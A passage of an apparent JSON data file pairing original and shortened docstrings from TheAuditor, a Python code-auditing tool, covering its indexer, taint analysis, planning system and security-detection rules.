    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a GraphQL argument directive to the batch (junction table).\n\n        Schema: graphql_arg_directives(id, field_id, arg_name, directive_name, arguments_json)\n\n        Args:\n            field_id: FK part 1 to graphql_field_args\n            arg_name: FK part 2 to graphql_field_args\n            directive_name: Directive name with @ prefix (e.g., '@deprecated')\n            arguments_json: JSON object of directive arguments (optional)\n\n        NO FALLBACKS. (field_id, arg_name) MUST exist.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL argument directive to the batch (junction table).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a GraphQL execution graph edge record to the batch.\n\n        Represents execution flow from GraphQL fields to backend symbols.\n\n        Args:\n            from_field_id: FK to graphql_fields.field_id (source field)\n            to_symbol_id: FK to symbols.symbol_id (target function/method)\n            edge_kind: Edge type - 'resolver' (field->resolver) or 'downstream_call' (resolver->callee)\n\n        NO FALLBACKS. Both from_field_id and to_symbol_id MUST exist.\n        Edge kind MUST be 'resolver' or 'downstream_call' - validated at insert time.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL execution graph edge record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/planning_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a refactor history record to the batch.\n\n        Args:\n            timestamp: ISO timestamp when refactor was executed\n            target_file: File that was refactored\n            refactor_type: Type of refactor (split, rename, consolidate)\n            migrations_found: Number of migrations found\n            migrations_complete: Number of migrations completed\n            schema_consistent: Boolean (as INTEGER) - schema consistency check\n            validation_status: Validation result (success, failed, partial)\n            details_json: Additional details as JSON string\n        \"\"\"",
    "truncated": "\"\"\"Add a refactor history record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/planning_database.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Planning and meta-system database operations.\n\nThis module contains add_* methods for PLANNING_TABLES defined in schemas/planning_schema.py.\nHandles 9 planning tables including plans, phases, tasks, jobs, specs, snapshots, diffs, and refactor tracking.\n\nERIC'S FRAMEWORK INTEGRATION:\n    Phase → Task → Job hierarchy enables problem decomposition thinking:\n    - Phases define success criteria (with \"Success Criteria\" field)\n    - Tasks break down phase goals into actionable steps\n    - Jobs are atomic checkbox items within tasks\n    - Audit loops at task and phase level enforce loop-until-correct semantics\n\"\"\"",
    "truncated": "\"\"\"Planning and meta-system database operations.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/docker.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extractor for Dockerfile files.\n\n    Extracts FACTS ONLY:\n    - Base image\n    - Environment variables\n    - Build arguments\n    - User instruction\n    - Healthcheck presence\n    - Exposed ports\n\n    Security checks are performed by rules/deployment/docker_analyze.py.\n    \"\"\"",
    "truncated": "\"\"\"Extractor for Dockerfile files.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/github_actions.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Extract ${{ }} expression references from text.\n\n        Parses GitHub Actions expressions like:\n        - ${{ github.event.pull_request.head.sha }}\n        - ${{ secrets.GITHUB_TOKEN }}\n        - ${{ needs.build.outputs.version }}\n\n        Args:\n            step_id: Parent step ID\n            location: Where reference appears ('run', 'env', 'with', 'if')\n            text: Text content to scan for references\n        \"\"\"",
    "truncated": "\"\"\"Extract ${{ }} expression references from text.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Store extracted data in the database - DELEGATED TO DataStorer.\n\n        This method now delegates all storage operations to the DataStorer class.\n        The God Method (1,169 lines) has been refactored into 66 focused handler methods.\n\n        Includes DATA FIDELITY CHECK: compares extraction manifest vs storage receipt\n        to detect silent data loss. See: theauditor/indexer/fidelity.py\n\n        Args:\n            file_path: Path to the source file\n            extracted: Dictionary of extracted data\n        \"\"\"",
    "truncated": "\"\"\"Store extracted data in the database - DELEGATED TO DataStorer.\"\"\""
  },
  {
    "file": "theauditor/indexer/schema.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Get schema for a specific table.\n\n    Args:\n        table_name: Name of the table\n\n    Returns:\n        TableSchema object\n\n    Raises:\n        ValueError: If table doesn't exist\n    \"\"\"",
    "truncated": "\"\"\"Get schema for a specific table.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Calculate centrality scores using PageRank-like algorithm.\n\n        This is an INTERPRETIVE scoring algorithm that assigns importance\n        based on graph topology.\n\n        Args:\n            graph: Graph with nodes and edges\n\n        Returns:\n            Dict mapping node IDs to centrality scores [0, 1]\n        \"\"\"",
    "truncated": "\"\"\"Calculate centrality scores using PageRank-like algorithm.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Add interpretive labels to graph summary data.\n\n        This method adds subjective interpretations to raw graph statistics,\n        such as coupling levels and architectural insights.\n\n        Args:\n            graph_data: Raw graph summary from analyzer\n\n        Returns:\n            Enhanced summary with interpretive insights\n        \"\"\"",
    "truncated": "\"\"\"Add interpretive labels to graph summary data.\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Classify dependencies into actionable risk buckets.\n\n    Organizes impact data into production code, tests, config files,\n    and external dependencies for smarter risk assessment.\n\n    Args:\n        impact_list: List of dependency dictionaries with 'file' keys\n\n    Returns:\n        Dictionary with 'breakdown' (categorized lists) and 'metrics' (counts)\n    \"\"\"",
    "truncated": "\"\"\"Classify dependencies into actionable risk buckets.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Extract ALL journal event types (not just apply_patch!).\n\n    Returns rich dict with:\n    {\n        \"phase_timing\": {phase_name: {\"elapsed\": 120.5, \"status\": \"success\"}},\n        \"file_touches\": {file_path: {\"analyze\": 3, \"findings\": 12}},\n        \"findings_by_file\": {file_path: [{\"severity\": \"critical\", \"category\": \"sqli\"}]},\n        \"patches\": {file_path: {\"success\": 2, \"failed\": 1}},\n        \"pipeline_summary\": {\"total_phases\": 25, \"failed_phases\": 0, ...}\n    }\n    \"\"\"",
    "truncated": "\"\"\"Extract ALL journal event types (not just apply_patch!).\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Parse raw/fce.json for factual correlation analysis.\n\n    Returns dict mapping file paths to correlation data:\n    {\n        \"auth.py\": {\n            \"failure_correlations\": 3,\n            \"cross_file_dependencies\": 5,\n            \"hotspot_score\": 0.85\n        }\n    }\n    \"\"\"",
    "truncated": "\"\"\"Parse raw/fce.json for factual correlation analysis.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Parse raw/cfg_analysis.json for control flow complexity per function.\n\n    Returns dict mapping file paths to CFG metrics:\n    {\n        \"service.py\": {\n            \"max_cyclomatic_complexity\": 18,\n            \"avg_cyclomatic_complexity\": 6.5,\n            \"complex_function_count\": 3\n        }\n    }\n    \"\"\"",
    "truncated": "\"\"\"Parse raw/cfg_analysis.json for control flow complexity per function.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Parse raw/frameworks.json for detected frameworks and versions.\n\n    Returns dict mapping file paths to framework info:\n    {\n        \"app.py\": {\n            \"frameworks\": [\"flask\", \"sqlalchemy\"],\n            \"has_vulnerable_version\": True,\n            \"framework_count\": 2\n        }\n    }\n    \"\"\"",
    "truncated": "\"\"\"Parse raw/frameworks.json for detected frameworks and versions.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/models.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Build feature matrix for files.\n\n    Args:\n        file_paths: List of file paths to build features for\n        manifest_path: Path to manifest.json for file metadata\n        db_features: Combined database features from features.py\n        historical_data: Combined historical data from loaders.py\n        intelligent_features: Optional intelligent features from intelligence.py\n\n    Returns:\n        Tuple of (feature matrix, feature name map)\n    \"\"\"",
    "truncated": "\"\"\"Build feature matrix for files.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Result of applying semantic context to findings.\n\n    This structure organizes findings by their semantic meaning in your codebase.\n\n    Attributes:\n        obsolete: Findings that match obsolete patterns (need updating)\n        current: Findings that match current patterns (correct)\n        transitional: Findings using transitional patterns (OK for now)\n        unclassified: Findings that don't match any pattern\n        mixed_files: Files with both obsolete and current patterns\n        summary: Statistics about the classification\n    \"\"\"",
    "truncated": "\"\"\"Result of applying semantic context to findings.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Load semantic context from YAML file.\n\n        Args:\n            yaml_path: Path to YAML context file\n\n        Returns:\n            Loaded SemanticContext instance\n\n        Raises:\n            FileNotFoundError: If YAML file doesn't exist\n            ValueError: If YAML format is invalid\n        \"\"\"",
    "truncated": "\"\"\"Load semantic context from YAML file.\"\"\""
  },
  {
    "file": "theauditor/manifest_parser.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Normalize a Cargo dependency spec to a version string.\n\n        Args:\n            spec: Can be:\n                - \"1.0\" (simple version string)\n                - {\"version\": \"1.0\", \"features\": [...]}\n                - {\"workspace\": true}\n                - {\"git\": \"...\", \"branch\": \"...\"}\n\n        Returns:\n            Version string, \"workspace\", \"git\", or str(spec)\n        \"\"\"",
    "truncated": "\"\"\"Normalize a Cargo dependency spec to a version string.\"\"\""
  },
  {
    "file": "theauditor/pipeline/ui.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Central UI handler for TheAuditor.\n\nSingle source of truth for Rich console styling. Import this instead of\ninstantiating Console() in every command file.\n\nUsage:\n    from theauditor.pipeline.ui import console, print_header, print_error\n\n    console.print(\"[success]All checks passed[/success]\")\n    print_header(\"AUDIT RESULTS\")\n    print_error(\"Database not found\")\n\"\"\"",
    "truncated": "\"\"\"Central UI handler for TheAuditor.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Create new plan and return plan ID.\n\n        Args:\n            name: Plan name (required)\n            description: Plan description\n            metadata: Optional metadata dict (stored as JSON)\n\n        Returns:\n            plan_id: ID of created plan\n\n        NO FALLBACKS. Raises sqlite3.IntegrityError if name is duplicate.\n        \"\"\"",
    "truncated": "\"\"\"Create new plan and return plan ID.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add diff to snapshot.\n\n        Args:\n            snapshot_id: ID of snapshot\n            file_path: Path of changed file\n            diff_text: Full unified diff text\n            added_lines: Number of added lines\n            removed_lines: Number of removed lines\n\n        Returns:\n            diff_id: ID of created diff\n        \"\"\"",
    "truncated": "\"\"\"Add diff to snapshot.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Add a job (checkbox item) to a task (hierarchical task breakdown).\n\n        Args:\n            task_id: ID of task\n            job_number: Job number within task\n            description: Job description (checkbox text)\n            completed: Job completion status (0 or 1, SQLite BOOLEAN)\n            is_audit_job: Flag for audit jobs (0 or 1, SQLite BOOLEAN)\n            created_at: Creation timestamp (auto-generated if empty)\n\n        NO FALLBACKS. Raises sqlite3.IntegrityError if duplicate job_number.\n        \"\"\"",
    "truncated": "\"\"\"Add a job (checkbox item) to a task (hierarchical task breakdown).\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Generate a unified diff between two shadow commits.\n\n        Args:\n            old_sha: SHA of older commit (None for first commit)\n            new_sha: SHA of newer commit\n\n        Returns:\n            str: Unified diff text\n\n        Raises:\n            KeyError: If SHA not found in repository\n        \"\"\"",
    "truncated": "\"\"\"Generate a unified diff between two shadow commits.\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"List all snapshots in the shadow repository.\n\n        Args:\n            limit: Maximum number of snapshots to return\n\n        Returns:\n            List of dicts with snapshot metadata:\n                - sha: Commit SHA\n                - message: Commit message\n                - timestamp: ISO timestamp\n                - files: List of files in snapshot\n        \"\"\"",
    "truncated": "\"\"\"List all snapshots in the shadow repository.\"\"\""
  },
  {
    "file": "theauditor/planning/verification.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Verification integration for planning system.\n\nThis module bridges planning with RefactorRuleEngine and CodeQueryEngine.\n\nIntegration Points:\n- RefactorProfile.load_from_string() (refactor/profiles.py:130)\n- RefactorRuleEngine.evaluate() (refactor/profiles.py:257)\n- CodeQueryEngine.find_symbol() (context/query.py:158)\n- CodeQueryEngine.get_api_handlers() (context/query.py:412)\n\nNO FALLBACKS. Hard failure if spec YAML is malformed or database query fails.\n\"\"\"",
    "truncated": "\"\"\"Verification integration for planning system.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Universal immutable context for all standardized rules.\n\n    Design Principles:\n    1. Contains everything a rule might need\n    2. Immutable during execution\n    3. Extensible via 'extra' without breaking changes\n    4. Helpers for common operations\n\n    Migration Note:\n    Old rules received various parameters (tree, file_path, **kwargs).\n    This unified context replaces ALL of those parameters.\n    \"\"\"",
    "truncated": "\"\"\"Universal immutable context for all standardized rules.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Check if a string has high Shannon entropy (potential secret).\n\n    Shannon entropy measures randomness. High entropy indicates\n    random-looking strings that might be API keys, tokens, or secrets.\n\n    Args:\n        value: String to analyze\n        threshold: Entropy threshold (default 4.0 bits per character)\n\n    Returns:\n        True if entropy exceeds threshold\n    \"\"\"",
    "truncated": "\"\"\"Check if a string has high Shannon entropy (potential secret).\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/unpinned_actions.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Check if step has access to secrets.\n\n    Args:\n        step_id: Step identifier\n        step_env: JSON string of step env vars\n        step_with: JSON string of step with args\n        job_id: Parent job identifier\n        cursor: Database cursor\n\n    Returns:\n        List of secret reference paths found (empty if no secrets)\n    \"\"\"",
    "truncated": "\"\"\"Check if step has access to secrets.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/unpinned_actions.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"GitHub Actions Unpinned Actions with Secrets Detection.\n\nDetects supply chain risk where third-party actions are pinned to mutable\nreferences (main, v1, develop) while having access to repository secrets.\n\nAttack Pattern:\n1. Action pinned to mutable ref like @main or @v1\n2. Step has access to secrets (via env, with, or secrets: inherit)\n3. Upstream maintainer compromise = instant secret theft\n\nCWE-829: Inclusion of Functionality from Untrusted Control Sphere\n\"\"\"",
    "truncated": "\"\"\"GitHub Actions Unpinned Actions with Secrets Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Analyze a rule function to determine its requirements.\n\n        Args:\n            name: Function name\n            func: The function object\n            module_obj: Imported module containing the rule\n            module_name: Module name string\n            category: Category name\n\n        Returns:\n            RuleInfo object with metadata about the rule\n        \"\"\"",
    "truncated": "\"\"\"Analyze a rule function to determine its requirements.\"\"\""
  },
  {
    "file": "theauditor/rules/security/input_validation_analyze.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Input Validation Analyzer - Schema Contract Compliant Implementation.\n\nDetects input validation vulnerabilities including validation bypasses,\ntype confusion, prototype pollution, and framework-specific issues using\nONLY indexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows v1.1+ schema contract compliance:\n- Frozensets for all patterns (O(1) lookups)\n- Direct database queries (assumes all tables exist per schema contract)\n- Uses parameterized queries (no SQL injection)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Input Validation Analyzer - Schema Contract Compliant Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/security/sourcemap_analyze.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Detect source map exposure vulnerabilities.\n\n    Uses hybrid approach:\n    - Database: Build configurations, webpack settings\n    - File I/O: Actual .map files and JavaScript in build directories\n\n    Args:\n        context: Standardized rule context with database and project paths\n\n    Returns:\n        List of source map exposure findings\n    \"\"\"",
    "truncated": "\"\"\"Detect source map exposure vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/reactivity_analyze.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Vue.js reactivity and props mutation analyzer - Database-First Implementation.\n\nThis module detects Vue-specific anti-patterns using database queries:\n1. Direct props mutation (violates one-way data flow)\n2. Non-reactive data initialization (shared state bug)\n\nDatabase-First Architecture (v1.1+):\n- vue_components table stores props_definition (from indexer)\n- assignments table tracks all variable assignments\n- Join tables to detect props mutations\n- NO manual AST traversal (indexer already extracted this data)\n\"\"\"",
    "truncated": "\"\"\"Vue.js reactivity and props mutation analyzer - Database-First Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/xss_analyze.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"XSS Detection - Framework-Aware Golden Standard Implementation.\n\nCRITICAL: This module queries frameworks table to eliminate false positives.\nUses frozensets for O(1) lookups following Golden Standard pattern.\n\nNO AST TRAVERSAL. NO FILE I/O. Pure database queries.\n\nREFACTORED (2025-11-22):\n- Constants moved to constants.py (Single Source of Truth)\n- Context manager + sqlite3.Row for name-based access\n- SANITIZER_CALL_PATTERNS with '(' to prevent FPs on definitions\n\"\"\"",
    "truncated": "\"\"\"XSS Detection - Framework-Aware Golden Standard Implementation.\"\"\""
  },
  {
    "file": "theauditor/sandbox_executor.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Find .auditor_venv in current directory or parent directories.\n\n    Walks up the directory tree to find the nearest bundled runtime venv.\n    This allows running commands from subdirectories.\n\n    Args:\n        root_path: Starting directory (defaults to cwd)\n\n    Returns:\n        Path to .auditor_venv or None if not found\n    \"\"\"",
    "truncated": "\"\"\"Find .auditor_venv in current directory or parent directories.\"\"\""
  },
  {
    "file": "theauditor/sandbox_executor.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Get path to bundled Node.js executable.\n\n    Args:\n        root_path: Starting directory to search for .auditor_venv (defaults to cwd)\n\n    Returns:\n        Path to node executable\n\n    Raises:\n        RuntimeError: If .auditor_venv or node not found\n    \"\"\"",
    "truncated": "\"\"\"Get path to bundled Node.js executable.\"\"\""
  },
  {
    "file": "theauditor/sandbox_executor.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Get path to bundled npm executable.\n\n    Args:\n        root_path: Starting directory to search for .auditor_venv (defaults to cwd)\n\n    Returns:\n        Path to npm executable (or npm.cmd on Windows)\n\n    Raises:\n        RuntimeError: If .auditor_venv or npm not found\n    \"\"\"",
    "truncated": "\"\"\"Get path to bundled npm executable.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Lightweight pattern accumulator for taint sources, sinks, and sanitizers.\n\n    Populated dynamically by orchestrator from 200+ rules, then fed to discovery.\n\n    Structure: Language-aware nested dictionaries\n        sources[language][category] = [patterns]\n        sinks[language][category] = [patterns]\n        sanitizers[language] = [patterns]\n\n    This allows orchestrator to filter rules by detected frameworks (e.g., only\n    run Python rules if Flask detected) and populate registry with pre-filtered patterns.\n    \"\"\"",
    "truncated": "\"\"\"Lightweight pattern accumulator for taint sources, sinks, and sanitizers.\"\"\""
  },
  {
    "file": "theauditor/taint/discovery.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n        Discover sanitizers from framework tables.\n\n        Queries database for:\n        - validation_framework_usage (Joi, Yup, etc. validators)\n        - python_validators (Pydantic validators)\n        - sequelize_models (ORM models with safe parameterization)\n        - python_orm_models (SQLAlchemy/Django models)\n\n        Returns:\n            List of sanitizer dictionaries to register in TaintRegistry\n        \"\"\"",
    "truncated": "\"\"\"Discover sanitizers from framework tables.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Complete forward flow resolution to generate atomic truth.\n\n        Algorithm:\n            1. Get ALL entry points from graph (not pattern-based)\n            2. Get ALL exit points from graph (not pattern-based)\n            3. Trace EVERY path from entry to exit using BFS\n            4. Record ALL paths with complete provenance\n            5. Write resolved flows to resolved_flow_audit table\n\n        Returns:\n            Number of flows resolved and written to database\n        \"\"\"",
    "truncated": "\"\"\"Complete forward flow resolution to generate atomic truth.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Get all exit points from the unified graph.\n\n        Exit points are nodes in the graph that represent sinks:\n            - Variables passed to SQL query functions\n            - Variables passed to response functions\n            - Variables passed to external API calls\n            - Variables written to filesystem\n            - Variables logged to console\n\n        Returns:\n            Set of node IDs representing exit points (format: file::function::variable)\n        \"\"\"",
    "truncated": "\"\"\"Get all exit points from the unified graph.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Conservative alias check (no expensive alias analysis).\n\n        From paper (page 10): \"Our taint analysis deliberately omits computing\n        complete aliasing information... This deliberate trade-off of soundness\n        for scalability drastically reduces theoretical complexity.\"\n\n        Args:\n            ap1, ap2: Access paths to compare\n\n        Returns:\n            True if paths could potentially alias (conservative)\n        \"\"\"",
    "truncated": "\"\"\"Conservative alias check (no expensive alias analysis).\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Check if two nodes represent the same model type.\n\n        Useful for ORM aliasing - detecting that 'user' in File A and\n        'user' in File B both refer to the 'User' model.\n\n        Args:\n            node_a_id: First node ID\n            node_b_id: Second node ID\n\n        Returns:\n            True if both nodes have same non-null model name\n        \"\"\"",
    "truncated": "\"\"\"Check if two nodes represent the same model type.\"\"\""
  },
  {
    "file": "theauditor/utils/finding_priority.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Sort findings by priority for optimal report organization.\n\n    Critical security issues will appear first, style issues last.\n    This ensures AI sees the most important issues within its\n    limited context window.\n\n    Args:\n        findings: List of finding dictionaries\n\n    Returns:\n        New sorted list (original unchanged)\n    \"\"\"",
    "truncated": "\"\"\"Sort findings by priority for optimal report organization.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Get exclusion patterns for TheAuditor's own files.\n\n    Centralized function to provide consistent exclusion patterns\n    across all commands that support --exclude-self.\n\n    Args:\n        exclude_self_enabled: Whether to exclude TheAuditor's own files\n\n    Returns:\n        List of exclusion patterns if enabled, empty list otherwise\n    \"\"\"",
    "truncated": "\"\"\"Get exclusion patterns for TheAuditor's own files.\"\"\""
  },
  {
    "file": "theauditor/utils/meta_findings.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Format a graph hotspot into a standard finding.\n\n    Args:\n        hotspot: Hotspot dict from graph analyzer with fields:\n                 - file or id: File path\n                 - score or total_connections: Connectivity score\n                 - in_degree, out_degree: Dependency counts\n\n    Returns:\n        Formatted finding dict\n    \"\"\"",
    "truncated": "\"\"\"Format a graph hotspot into a standard finding.\"\"\""
  },
  {
    "file": "theauditor/utils/rate_limiter.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Lightweight async rate limiter that ensures minimum delay between requests.\n\n    Unlike Semaphore which limits concurrency (width), this limits frequency (speed).\n    Uses non-blocking asyncio.sleep so other tasks can run while waiting.\n\n    Usage:\n        limiter = AsyncRateLimiter(0.1)  # 10 req/sec\n        async with some_semaphore:\n            await limiter.acquire()\n            # ... make request\n    \"\"\"",
    "truncated": "\"\"\"Lightweight async rate limiter that ensures minimum delay between requests.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Get path to binary in main venv (Python linters).\n\n        Args:\n            name: Binary name (e.g., 'ruff', 'mypy', 'black')\n            required: If True, raise FileNotFoundError when missing\n\n        Returns:\n            Path to binary, or None if not required and not found\n\n        Raises:\n            FileNotFoundError: If required=True and binary not found\n        \"\"\"",
    "truncated": "\"\"\"Get path to binary in main venv (Python linters).\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"Centralized tool path management for TheAuditor's sandboxed tools.\n\nThis module provides a single source of truth for locating binaries in the\n.auditor_venv/.theauditor_tools sandbox, eliminating path construction duplication\nacross venv_install.py, linters.py, and vulnerability_scanner.py.\n\nPHILOSOPHY:\n- DRY: One place to update when sandbox structure changes\n- Fail-fast: Raise FileNotFoundError with helpful messages\n- Platform-aware: Handle Windows/Unix path differences\n- Fallback support: Check system PATH as secondary option\n\"\"\"",
    "truncated": "\"\"\"Centralized tool path management for TheAuditor's sandboxed tools.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 12,
    "original": "\"\"\"\n    Download and extract portable Node.js runtime with integrity verification.\n\n    Args:\n        sandbox_dir: Directory to install Node.js into (.auditor_venv/.theauditor_tools)\n\n    Returns:\n        Path to node executable\n\n    Raises:\n        RuntimeError: If download fails or checksum doesn't match\n    \"\"\"",
    "truncated": "\"\"\"Download and extract portable Node.js runtime with integrity verification.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/advanced_extractors.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract copy protocol (__copy__, __deepcopy__).\n\n    Returns:\n        List of copy protocol dicts:\n        {\n            'line': int,\n            'class_name': str,\n            'has_copy': bool,\n            'has_deepcopy': bool,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract copy protocol (__copy__, __deepcopy__).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cdk_extractor.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract CDK logical ID (construct name) from call arguments.\n\n    CDK constructs use pattern: Construct(self, \"LogicalID\", ...)\n    The 2nd positional argument is the logical ID string.\n\n    Args:\n        call_node: AST Call node\n\n    Returns:\n        Construct name string or None if not found/not a string\n    \"\"\"",
    "truncated": "\"\"\"Extract CDK logical ID (construct name) from call arguments.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cdk_extractor.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Serialize property value AST node to string.\n\n    Uses ast.unparse() to convert expression to source code string.\n    This preserves the original expression without evaluation.\n\n    Args:\n        value_node: AST node representing property value\n\n    Returns:\n        String representation of the value expression\n    \"\"\"",
    "truncated": "\"\"\"Serialize property value AST node to string.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/class_feature_extractors.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract method types (@classmethod, @staticmethod, instance methods).\n\n    Returns:\n        List of method type dicts:\n        {\n            'line': int,\n            'method_name': str,\n            'method_type': str,  # 'instance' | 'class' | 'static'\n            'in_class': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract method types (@classmethod, @staticmethod, instance methods).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/framework_extractors.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Collect dependency call targets from FastAPI route parameters.\n\n    TEMPORARY: This function is not yet used but will be needed for FastAPI routes extraction.\n    Will be moved to fastapi_extractors.py in future PR.\n\n    Args:\n        func_node: ast.FunctionDef node representing a FastAPI route function\n\n    Returns:\n        List of dependency target names extracted from Depends() calls\n    \"\"\"",
    "truncated": "\"\"\"Collect dependency call targets from FastAPI route parameters.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract SQL queries from database execution calls using AST.\n\n    Detects SQL queries in:\n    - sqlite3.execute()\n    - psycopg2.execute()\n    - SQLAlchemy session.execute()\n    - Django ORM .raw()\n\n    Returns:\n        List of SQL query dicts with command, tables, and source info\n    \"\"\"",
    "truncated": "\"\"\"Extract SQL queries from database execution calls using AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/stdlib_pattern_extractors.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract contextlib usage (@contextmanager, closing(), suppress()).\n\n    Returns:\n        List of contextlib pattern dicts:\n        {\n            'line': int,\n            'pattern': str,  # 'contextmanager' | 'closing' | 'suppress' | etc.\n            'is_decorator': bool,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract contextlib usage (@contextmanager, closing(), suppress()).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/task_graphql_extractors.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract Graphene GraphQL resolver methods.\n\n    Graphene pattern:\n        class UserType(graphene.ObjectType):\n            name = graphene.String()\n\n            def resolve_name(self, info):\n                return self.name\n\n    Returns resolver metadata WITHOUT field_id (correlation happens in graphql build command).\n    \"\"\"",
